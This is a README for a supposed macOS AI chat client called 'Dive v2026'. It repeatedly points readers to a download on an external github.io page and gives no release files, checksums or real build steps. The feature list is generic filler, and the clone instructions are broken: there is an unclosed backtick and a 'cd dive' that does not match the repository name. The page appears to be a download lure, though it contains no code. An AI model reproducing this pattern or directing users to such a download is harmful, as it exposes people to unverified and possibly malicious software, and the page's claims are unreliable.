# Dive v2026 - desktop client / web app 2026

> **Dive is a local-first macOS chat client for Ollama, Pi, and cloud models, built for offline conversations, document retrieval, and version 2026 workflows.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henryadamslq4296/dive-2026-web-app?style=flat-square)](https://github.com/henryadamslq4296/dive-2026-web-app)

---

<p align="center">
  <a href="https://henryadamslq4296.github.io/dive-2026-web-app/">
    <img src="https://img.shields.io/badge/Download-Dive%20Latest-brightgreen?style=for-the-badge" alt="Download Dive">
  </a>
</p>

> **[Direct Download - Dive v2026](https://henryadamslq4296.github.io/dive-2026-web-app/)**

---

[Download Latest Build](https://henryadamslq4296.github.io/dive-2026-web-app/)

---

## What Dive Is

Dive combines a macOS desktop client and a web app into a local-first workspace for AI chat. It unifies Ollama, Pi agent, and cloud model access in a single place, making it easier to move between modes while keeping your sessions and data organized.

The app is geared toward offline conversations, document-aware responses, and keeping control of your workspace on your Mac. SQLite-backed chat history, auto-saving notes, PDF extraction, and retrieval features for larger collections make it a practical fit for research, reading, and everyday assistant tasks.

---

## Capabilities

- Local-first chat experience built for macOS
- Three operating modes: Ollama, Pi, and Cloud
- Offline chat support with Ollama
- MCP tool integration for external workflows
- Sandboxed custom skills for controlled extensions
- Local RAG indexing for large book collections
- PDF text extraction for document processing
- Automatic saving for conversation history and notes
- macOS daemon and LaunchAgent support for background operation

---

## Getting Started

Clone the repo and open it in your preferred macOS setup:

- `git clone https://github.com/henryadamslq4296/dive-2026-web-app.git
- `cd dive`

From there, build or launch the app using the project's standard macOS workflow. If you use the published build, you can start from the download page linked above and follow the app-specific launch instructions for your system.

---

## How to Use Dive

A normal session starts by selecting a model mode and then either starting a chat or bringing in documents:

1. Launch Dive on macOS.
2. Choose Ollama, Pi, or Cloud based on your environment.
3. Add documents or direct the app to a library for indexing.
4. Ask questions in chat and let the RAG layer provide relevant context.
5. Check saved conversations and notes as you continue working.

For more advanced workflows, connect MCP tools or add custom skills inside the app's supported sandboxed environment.

---

## Configuration

Dive stores its working data locally, using SQLite for history and notes. Document indexes, skill settings, and mode-specific preferences live in the app's local configuration area.

Example configuration shape:

    {
      "mode": "ollama",
      "storage": "sqlite",
      "rag": true,
      "pdf_extraction": true,
      "mcp": true
    }

If you change data locations or background behavior, check the app preferences and the macOS LaunchAgent setup used by the daemon.

---

## Requirements

- macOS
- A compatible local runtime for Ollama if you want offline model use
- Access to Pi or cloud models for those modes
- Local disk space for SQLite data, history, notes, and RAG indexes
- Enough storage and processing capacity for PDF extraction and large library indexing

---

## FAQ

**How do I get the latest build?**  
Open the current release page with the download link above.

**Can I use Dive offline?**  
Yes. Ollama mode is intended for offline chat workflows.

**Where are chats and notes stored?**  
They are kept locally through SQLite-backed storage.

**Does Dive support documents?**  
Yes. It includes PDF extraction and local RAG indexing for retrieval across larger collections.

**What if background behavior is not starting on macOS?**  
Check the LaunchAgent or daemon setup, then confirm the app has the needed macOS permissions.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
